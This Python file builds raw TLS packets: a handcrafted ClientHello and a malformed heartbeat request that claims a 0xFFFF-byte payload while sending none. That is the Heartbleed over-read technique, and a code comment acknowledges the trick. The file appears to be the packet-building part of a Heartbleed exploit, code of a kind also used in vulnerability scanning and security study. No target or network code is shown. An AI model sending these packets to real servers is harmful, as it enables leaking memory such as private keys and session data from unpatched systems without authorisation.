def get_heartbeat():
    return bytes([
        0x18,       # Content Type Heartbeat
        0x03, 0x03, # TLSv1.2
        0x00, 0x03, # Length of Record
        # Payload
        0x01,       # Request Heartbeat
        0xFF, 0xFF  # Reply with following 0xFFFF data (well... there's no data :D)
    ])

def hello_record():
    client_hello = get_client_hello()

    tls_header = [
        0x16, # Content Type: Handshake
        0x03, 0x01, # Version: TLS 1.0
    ] + length_in_bytes(client_hello)

    return bytes(tls_header + client_hello)

def length_in_bytes(l):
    l = len(l)
    return [ (l & 0xFF00) >> 8, l & 0x00FF ]

def get_random():
    return [ 0x44,
        0xc4, 0x42, 0x98, 0x98, 0x74, 0x32, 0x55, 0x20, 0xe8, 0xdd, 0x8a, 0xe7,
        0x9e, 0x5f, 0x7d, 0x56, 0x6e, 0x66, 0x59, 0x3e, 0x3e, 0x42, 0xcf, 0x68,
        0xbe, 0x06, 0xf2, 0xd8, 0xb0, 0x8a, 0x22 ]

def get_ciphers():
    return [
        0xc0, 0x30,
        0xc0, 0x2c, 0xc0, 0x28, 0xc0, 0x24, 0xc0, 0x14, 0xc0, 0x0a, 0x00, 0xa5,
        0x00, 0xa3, 0x00, 0xa1, 0x00, 0x9f, 0x00, 0x6b, 0x00, 0x6a, 0x00, 0x69,
        0x00, 0x68, 0x00, 0x39, 0x00, 0x38, 0x00, 0x37, 0x00, 0x36, 0x00, 0x88,
        0x00, 0x87, 0x00, 0x86, 0x00, 0x85, 0xc0, 0x32, 0xc0, 0x2e, 0xc0, 0x2a,
        0xc0, 0x26, 0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x9d, 0x00, 0x3d, 0x00, 0x35,
        0x00, 0x84, 0xc0, 0x2f, 0xc0, 0x2b, 0xc0, 0x27, 0xc0, 0x23, 0xc0, 0x13,
        0xc0, 0x09, 0x00, 0xa4, 0x00, 0xa2, 0x00, 0xa0, 0x00, 0x9e, 0x00, 0x67,
        0x00, 0x40, 0x00, 0x3f, 0x00, 0x3e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x31,
        0x00, 0x30, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x98, 0x00, 0x97, 0x00, 0x45,
        0x00, 0x44, 0x00, 0x43, 0x00, 0x42, 0xc0, 0x31, 0xc0, 0x2d, 0xc0, 0x29,
        0xc0, 0x25, 0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x9c, 0x00, 0x3c, 0x00, 0x2f,
        0x00, 0x96, 0x00, 0x41, 0x00, 0x07, 0xc0, 0x12, 0xc0, 0x08, 0x00, 0x16,
        0x00, 0x13, 0x00, 0x10, 0x00, 0x0d, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a,
        0x00, 0xff ]

def get_extensions():
    return [ 
        0x00, 0x00, 0x00, 0x0e, 0x00, 0x0c,
        0x00, 0x00, 0x09, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74,
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x1c,
        0x00, 0x1a, 0x00, 0x17, 0x00, 0x19, 0x00, 0x1c, 0x00, 0x1b, 0x00, 0x18,
        0x00, 0x1a, 0x00, 0x16, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x09, 0x00, 0x0a, 0x00, 0x0d, 0x00, 0x20, 0x00, 0x1e, 0x06, 0x01,
        0x06, 0x02, 0x06, 0x03, 0x05, 0x01, 0x05, 0x02, 0x05, 0x03, 0x04, 0x01,
        0x04, 0x02, 0x04, 0x03, 0x03, 0x01, 0x03, 0x02, 0x03, 0x03, 0x02, 0x01,
        0x02, 0x02, 0x02, 0x03, 0x00, 0x0f, 0x00, 0x01, 0x01, 0x00, 0x15, 0x00,
        0xcc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00 ]

def get_client_hello():
    random = get_random()
    cipher_suites = get_ciphers()
    extensions = get_extensions()

    client_hello = random + [
            0x00 # Session ID Length
        ] + length_in_bytes(cipher_suites) + cipher_suites + [
            0x01, # Compression Methods Length: 1
            0x00, # Compression Method (null)
        ] + length_in_bytes(extensions) + extensions

    client_hello_header = [
        0x01, # Handshake Type: Client Hello
        0x00, # first byte of length
    ] + length_in_bytes(client_hello) + [ # should be 0x01, 0xfc
        0x03, 0x03, # Version: TLSv1.2
    ]

    return client_hello_header + client_hello 
